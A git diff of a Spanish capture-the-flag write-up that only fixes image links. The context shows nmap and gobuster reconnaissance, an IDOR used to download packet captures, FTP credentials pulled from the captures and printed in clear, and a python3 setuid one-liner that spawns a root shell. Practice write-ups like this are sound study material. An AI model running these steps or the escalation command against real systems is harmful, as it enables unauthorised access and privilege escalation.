@@ -6,7 +6,7 @@ _____
 ping -c 1 10.10.10.245
 ```
 
-![Pasted image 20251102043514](../../../../Anexos/Pasted%20image%2020251102043514.png)
+![Pasted image 20251102043514](../../../Anexos/Pasted%20image%2020251102043514.png)
 
 Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
 
@@ -24,7 +24,7 @@ Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión d
 nmap -sCV -p80 -n -Pn -vvv --min-rate 5000 -oN version 172.17.0.2
 ```
 
-![Pasted image 20251102043746](../../../../Anexos/Pasted%20image%2020251102043746.png)
+![Pasted image 20251102043746](../../../Anexos/Pasted%20image%2020251102043746.png)
 
 Vamos a echar un ojo al servicio web, donde de primeras vemos un posible usuario: **Nathan**
 
@@ -36,12 +36,12 @@ Antes de continuar voy a aplicar fuzzing para descubrir directorios y archivos o
 gobuster dir -u http://10.10.10.245/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -t 100 -o dirs.txt
 ```
 
-![Pasted image 20251102050021](../../../../Anexos/Pasted%20image%2020251102050021.png)
+![Pasted image 20251102050021](../../../Anexos/Pasted%20image%2020251102050021.png)
 
 Al acceder a capture, se nos crea una snapshot de seguridad con el siguiente formato: **NUMERO.pcap** siguiendo un orden numérico, empezando por el 0.
 Si lo ejecutamos, vemos que en la URL se crea lo siguiente:
 
-![Pasted image 20251102050141](../../../../Anexos/Pasted%20image%2020251102050141.png)
+![Pasted image 20251102050141](../../../Anexos/Pasted%20image%2020251102050141.png)
 
 No es difícil intentar probar si estamos ante un IDOR, lo cual así es y podemos comprobar que hay varios archivos ya creados, así que probamos número a número, empezando por el 0 para descargarlos todos y analizarlos en local. Para ello empezamos con el primero: **0.pcap** con el siguiente comando:
 
@@ -65,7 +65,7 @@ tshark -r 0.pcap | grep "FTP"
 nathan:Buck3tH4TF0RM3!
 ```
 
-![Pasted image 20251102051117](../../../../Anexos/Pasted%20image%2020251102051117.png)
+![Pasted image 20251102051117](../../../Anexos/Pasted%20image%2020251102051117.png)
 
 Accedemos por FTP y nos descargamos todo con el comando:
 
@@ -95,4 +95,4 @@ Lo que voy a hacer ahora es ejecutar un comando de python3 en modo interactivo c
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
 
-![Pasted image 20251102060157](../../../../Anexos/Pasted%20image%2020251102060157.png)
+![Pasted image 20251102060157](../../../Anexos/Pasted%20image%2020251102060157.png)
